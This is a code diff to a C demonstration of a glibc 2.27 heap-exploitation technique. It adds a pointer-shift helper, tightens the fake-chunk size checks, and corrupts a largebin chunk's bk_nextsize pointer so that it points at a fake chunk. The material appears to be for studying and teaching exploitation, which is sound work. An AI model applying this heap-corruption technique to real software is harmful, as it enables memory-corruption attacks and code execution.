@@ -34,6 +34,21 @@ void init(){
         clearenv();
 }
 
+// Get the AMOUNT to shift over for size and the offset on the largebin.
+// Needs to be a valid minimum sized chunk in order to work.
+int get_shift_amount(char* pointer){
+
+        int shift_amount = 0;
+        long long ptr = (long long)pointer;
+
+        while(ptr > 0x20){
+                ptr = ptr >> 8;
+                shift_amount += 1;
+        }
+
+        return shift_amount - 1; // Want amount PRIOR to this being zeroed out
+}
+
 int main(){
 
 	init();
@@ -67,20 +82,51 @@ int main(){
 	size, which comes from the upper bytes of the heap address.
 
 	NOTE: 
-	- This does have a 1/4 chance of working. If the 4th bit 
+	- This does have a 1/2 chance of failing. If the 4th bit 
 	of this value is set, then the size comparison will fail.
 	- Without this calculation, this COULD be brute forced.
 	*/
-	size_t alloc_size = ((size_t)unsorted_bin & 0xFFFF0000) >> 16;
-	alloc_size = (alloc_size & 0xFFFFFFFF8) - 0x10; // Remove the size bits
-	printf("In this case, the chunk size is 0x%lx\n", alloc_size);
+	int shift_amount = get_shift_amount(unsorted_bin);
+        printf("Shift Amount: %d\n", shift_amount);
+
+        size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
+        if(alloc_size < 0x10){
+                printf("Chunk Size: 0x%lx\n", alloc_size);
+                puts("Chunk size is too small");
+                exit(1);
+        }
+        alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; // Remove the size bits
+        printf("In this case, the chunk size is 0x%lx\n", alloc_size);
+
 
 	// Checks to see if the program will crash or not
-	if((alloc_size & 0xC) != 0){
-		puts("Allocation size has bit 4 of the size set; chunk will not get taken out of unsorted bin.");
-		puts("Please try again! :)");
-		puts("Exiting...");
-		return 1; 
+        /*
+        The fourth bit of the size and the 'non-main arena' chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. 
+
+        Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
+        validates to see if ONE of the following cases is true: 
+        - av == arena_for_chunk (mem2chunk (mem))
+        - chunk is mmaped
+
+        If the 'non-main arena' bit is set on the chunk, then the 
+        first case will fail. 
+        If the mmap bit is set, then this will pass. 
+        
+        So, either the arenas need to match up (our fake chunk is in the 
+        .bss section for this demo. So, clearly, this will not happen) OR
+        the mmap bit must be set.
+
+        The logic below validates that the fourth bit of the size
+        is NOT set and that either the mmap bit is set or the non-main 
+        arena bit is NOT set. If this is the case, the exploit should work.
+        */
+        if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))){
+                puts("Allocation size has bit 4 of the size set or ");
+                puts("mmap and non-main arena bit check will fail");
+                puts("Please try again! :)");
+                puts("Exiting...");
+                return 1;
+
 	}
 
 	large_bin  =  malloc ( 0x4d8 );  // size 0x4e0 
@@ -165,7 +211,7 @@ int main(){
 
 	Second vulnerability!!!
 	*/
-	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - 2; // large_bin->bk_nextsize
+	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin->bk_nextsize
 
 
 	/*
